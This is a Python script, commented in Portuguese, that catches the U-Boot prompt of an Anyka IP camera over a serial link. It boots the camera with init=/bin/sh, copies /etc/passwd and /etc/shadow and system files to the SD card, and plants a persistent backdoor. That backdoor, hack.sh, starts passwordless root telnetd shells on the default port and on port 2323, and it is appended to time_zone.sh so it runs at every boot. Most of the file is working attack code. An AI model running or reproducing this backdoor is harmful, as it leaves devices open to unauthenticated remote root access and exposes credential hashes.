#!/usr/bin/env python3
"""
U-BOOT HACK v2 - Versao gentil pro SoftwareSerial

O SoftwareSerial do Arduino NAO consegue full-duplex a 115200.
Quando manda dados (PC->Cam), ele desabilita interrupts e perde
dados da camera (Cam->PC).

Estrategia: alterna entre LER e ESCREVER.
- Le por 30ms (pega dados da camera)
- Manda 1 espaco (tenta interceptar U-Boot)
- Repete

Quando detectar U-Boot, manda Enter pra parar autoboot.
"""
import serial
import time
import sys

PORT = '/dev/ttyUSB0'
BAUD = 115200


def send_cmd(ser, cmd, wait=1.5):
    """Envia comando e retorna resposta, respeitando o SoftwareSerial"""
    ser.reset_input_buffer()
    # Manda caractere por caractere com micro-delay pra nao afogar
    for ch in (cmd + '\r\n'):
        ser.write(ch.encode())
        time.sleep(0.005)  # 5ms entre chars
    time.sleep(wait)
    data = ser.read(16384)
    return data.decode('utf-8', errors='replace') if data else ''


def main():
    ser = serial.Serial(PORT, BAUD, timeout=0.05)
    ser.reset_input_buffer()

    print("=" * 60)
    print("  U-BOOT INTERCEPTOR v2 (SoftwareSerial-friendly)")
    print("  Desliga e religa a camera AGORA!")
    print("=" * 60, flush=True)

    buf = b''
    start = time.time()
    uboot_caught = False
    uboot_seen = False
    hit_any_key_seen = False
    cycle = 0

    while time.time() - start < 120:
        cycle += 1

        # === FASE LEITURA: le por 30-50ms ===
        read_start = time.time()
        while time.time() - read_start < 0.03:
            data = ser.read(512)
            if data:
                buf += data
                text = data.decode('utf-8', errors='replace')
                for line in text.split('\n'):
                    l = line.strip()
                    if l and any(x in l for x in ['U-Boot', 'Hit', 'DRAM', 'MiB', 'SF:', 'Boot', 'Start', 'ak39', '=>', 'anyka']):
                        print(f'  {l[:120]}', flush=True)
            time.sleep(0.005)

        # === FASE ESCRITA: manda 1 espaco ===
        # Se viu "Hit any key" - manda MUITOS espaços rapido
        if hit_any_key_seen:
            ser.write(b' \r\n \r\n \r\n')
            time.sleep(0.01)
        else:
            ser.write(b' ')

        # === DETECCAO ===
        tail = buf[-2000:]

        # U-Boot apareceu?
        if b'U-Boot' in tail and not uboot_seen:
            uboot_seen = True
            print('>>> U-Boot detectado!', flush=True)

        # Hit any key?
        if b'Hit any key' in tail and not hit_any_key_seen:
            hit_any_key_seen = True
            print('>>> "Hit any key" detectado! Mandando interrupt!', flush=True)
            # Manda burst de enters e espaços
            for _ in range(10):
                ser.write(b'\r\n \r\n')
                time.sleep(0.005)

        # Prompt U-Boot?
        if any(x in tail[-300:] for x in [b'anyka#', b'=> ', b'AK39']):
            # Confirma
            time.sleep(0.2)
            ser.write(b'\r\n')
            time.sleep(0.5)
            extra = ser.read(4096)
            if extra:
                buf += extra
                etext = extra.decode('utf-8', errors='replace')
                print(etext, flush=True)

            tail2 = buf[-500:]
            if any(x in tail2 for x in [b'anyka#', b'=> ', b'AK39']):
                print('\n>>> U-BOOT SHELL CAPTURADO! <<<', flush=True)
                uboot_caught = True
                break

        # Kernel iniciou = perdemos
        if b'Starting kernel' in tail[-500:]:
            elapsed = time.time() - start
            print(f'\n>>> KERNEL INICIOU ({elapsed:.1f}s) - perdemos a janela <<<', flush=True)
            print('Desliga/religa de novo! (script continua tentando)', flush=True)
            buf = b''
            uboot_seen = False
            hit_any_key_seen = False

        # Status a cada ~5s
        if cycle % 100 == 0:
            elapsed = time.time() - start
            print(f'  [{elapsed:.0f}s] Aguardando... ({len(buf)} bytes)', flush=True)

        time.sleep(0.02)  # 20ms entre ciclos

    if not uboot_caught:
        print("\nNao conseguiu pegar U-Boot em 120s.")
        ser.close()
        return

    # ========================================
    # FASE 2: Estamos no U-Boot!
    # ========================================
    time.sleep(1)
    ser.read(8192)

    print("\n" + "=" * 60)
    print("[U-BOOT] Coletando info do ambiente...")
    print("=" * 60, flush=True)

    resp = send_cmd(ser, 'printenv', 3)
    print(resp, flush=True)

    resp = send_cmd(ser, 'printenv bootargs')
    print(f'\nBootargs atual: {resp}', flush=True)

    # ========================================
    # FASE 3: Modificar bootargs pra init=/bin/sh
    # ========================================
    print("\n" + "=" * 60)
    print("[U-BOOT] Modificando bootargs para init=/bin/sh")
    print("=" * 60, flush=True)

    new_bootargs = 'setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/bin/sh mem=64M'
    resp = send_cmd(ser, new_bootargs)
    print(f'setenv: {resp}', flush=True)

    resp = send_cmd(ser, 'printenv bootargs')
    print(f'Novo bootargs: {resp}', flush=True)

    print('[!] NAO salvei no env flash - so vale pra esse boot', flush=True)

    # ========================================
    # FASE 4: Boot!
    # ========================================
    print("\n" + "=" * 60)
    print("[U-BOOT] Bootando com init=/bin/sh...")
    print("=" * 60, flush=True)

    # Manda boot char por char
    for ch in 'boot\r\n':
        ser.write(ch.encode())
        time.sleep(0.005)

    # Espera kernel + shell
    buf2 = b''
    start2 = time.time()
    shell_ready = False

    while time.time() - start2 < 30:
        data = ser.read(4096)
        if data:
            buf2 += data
            text = data.decode('utf-8', errors='replace')
            sys.stdout.write(text)
            sys.stdout.flush()

            if b'/ #' in buf2[-200:] or b'~ #' in buf2[-200:] or b'sh:' in buf2[-200:]:
                print('\n\n>>> ROOT SHELL PURO! <<<', flush=True)
                shell_ready = True
                break
        time.sleep(0.02)

    if not shell_ready:
        for ch in '\r\n':
            ser.write(ch.encode())
            time.sleep(0.005)
        time.sleep(1)
        data = ser.read(4096)
        if data:
            text = data.decode('utf-8', errors='replace')
            print(text)
            if '#' in text:
                shell_ready = True
                print('>>> SHELL DETECTADO! <<<', flush=True)

    if not shell_ready:
        print('\nShell nao apareceu. Tentando...', flush=True)
        for ch in '\r\n':
            ser.write(ch.encode())
            time.sleep(0.005)
        time.sleep(2)
        for ch in 'echo SHELL_TEST\r\n':
            ser.write(ch.encode())
            time.sleep(0.005)
        time.sleep(2)
        data = ser.read(8192)
        text = data.decode('utf-8', errors='replace')
        print(text[:500])

    # ========================================
    # FASE 5: Shell root puro
    # ========================================
    print("\n" + "=" * 60)
    print("[SHELL PURO] Executando hack!")
    print("=" * 60, flush=True)

    setup_cmds = [
        ("Mount proc",     "mount -t proc proc /proc"),
        ("Mount sys",      "mount -t sysfs sys /sys"),
        ("Mount devpts",   "mkdir -p /dev/pts && mount -t devpts devpts /dev/pts"),
        ("Mount jffs2",    "mount -t jffs2 /dev/mtdblock6 /rom 2>/dev/null"),
        ("Mount tmpfs",    "mount -t tmpfs tmpfs /tmp"),
        ("Mount SD",       "mkdir -p /mnt/disc1 && mount /dev/mmcblk0p1 /mnt/disc1 2>/dev/null || mount /dev/mmcblk0 /mnt/disc1 2>/dev/null"),
    ]

    for desc, cmd in setup_cmds:
        resp = send_cmd(ser, cmd, 2)
        clean = [l for l in resp.split('\n') if l.strip() and '#' not in l[:3]]
        print(f'  [{desc}] {" ".join(clean)[:100]}', flush=True)

    info_cmds = [
        ("ID",       "id"),
        ("Mount",    "mount"),
        ("MTD",      "cat /proc/mtd"),
        ("DF",       "df -h"),
        ("LS rom",   "ls -la /rom/"),
        ("LS SD",    "ls -la /mnt/disc1/"),
    ]

    for desc, cmd in info_cmds:
        resp = send_cmd(ser, cmd, 2)
        print(f'\n--- {desc} ---\n{resp}', flush=True)

    SD = '/mnt/disc1'
    dumps = [
        f"id > {SD}/id.txt",
        f"cp /etc/passwd {SD}/passwd.txt 2>/dev/null",
        f"cp /etc/shadow {SD}/shadow.txt 2>/dev/null",
        f"cat /etc/inittab > {SD}/inittab.txt 2>/dev/null",
        f"cat /etc/init.d/rc.local > {SD}/rc_local.txt 2>/dev/null",
        f"cat /etc/init.d/rcS > {SD}/rcS.txt 2>/dev/null",
        f"cat /ipc/setup.sh > {SD}/setup.txt 2>/dev/null",
        f"mount > {SD}/mount.txt",
        f"cat /proc/mtd > {SD}/mtd.txt",
        f"cat /proc/cpuinfo > {SD}/cpuinfo.txt",
        f"cat /proc/cmdline > {SD}/cmdline.txt",
        f"dmesg > {SD}/dmesg.txt 2>/dev/null",
        f"ls -laR /rom/ > {SD}/rom_list.txt 2>/dev/null",
        f"ls -laR /etc/jffs2/ > {SD}/jffs2_list.txt 2>/dev/null",
    ]

    print("\n[DUMPS]", flush=True)
    for cmd in dumps:
        resp = send_cmd(ser, cmd, 2)
        name = cmd.split('>')[-1].strip().split('/')[-1].split(' ')[0]
        print(f'  {name}', flush=True)

    send_cmd(ser, f"for f in /rom/*; do echo =$f; cat $f 2>/dev/null; done > {SD}/rom_all.txt", 5)
    send_cmd(ser, f"for f in /etc/init.d/*; do echo =$f; cat $f; done > {SD}/initd_all.txt", 5)
    print('  rom_all + initd_all', flush=True)

    # Hack persistente
    print("\n[HACK PERSISTENTE]", flush=True)

    send_cmd(ser, "echo '#!/bin/sh' > /rom/hack.sh", 1)
    send_cmd(ser, "echo '(while true;do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&' >> /rom/hack.sh", 1)
    send_cmd(ser, "echo 'telnetd -l /bin/sh &' >> /rom/hack.sh", 1)
    send_cmd(ser, "echo 'telnetd -l /bin/sh -p 2323 &' >> /rom/hack.sh", 1)
    send_cmd(ser, "chmod +x /rom/hack.sh", 1)
    print('  hack.sh criado', flush=True)

    send_cmd(ser, "grep -q hack /rom/time_zone.sh 2>/dev/null || echo '/rom/hack.sh &' >> /rom/time_zone.sh", 2)
    print('  time_zone.sh injetado', flush=True)

    resp = send_cmd(ser, "cat /rom/hack.sh", 2)
    print(f'\nhack.sh:\n{resp}', flush=True)

    resp = send_cmd(ser, "cat /rom/time_zone.sh 2>/dev/null", 2)
    print(f'\ntime_zone.sh:\n{resp}', flush=True)

    send_cmd(ser, f"cat /rom/hack.sh > {SD}/hack_check.txt", 1)
    send_cmd(ser, f"cat /rom/time_zone.sh > {SD}/tz_check.txt 2>/dev/null", 1)
    send_cmd(ser, f"echo HACK_V4_COMPLETE > {SD}/SUCCESS.txt", 1)

    print("\n" + "=" * 60)
    print("  HACK VIA U-BOOT COMPLETO!")
    print("  Dumps salvos no SD card.")
    print("  Hack persistente em /rom/hack.sh")
    print("  Pra reiniciar: desliga/religa camera")
    print("=" * 60)

    # Shell interativo
    print("\nEntrando em modo interativo (Ctrl+C pra sair)...")
    try:
        while True:
            cmd = input("cam# ")
            if cmd.strip():
                resp = send_cmd(ser, cmd, 2)
                print(resp)
    except (KeyboardInterrupt, EOFError):
        pass

    ser.close()


if __name__ == '__main__':
    main()
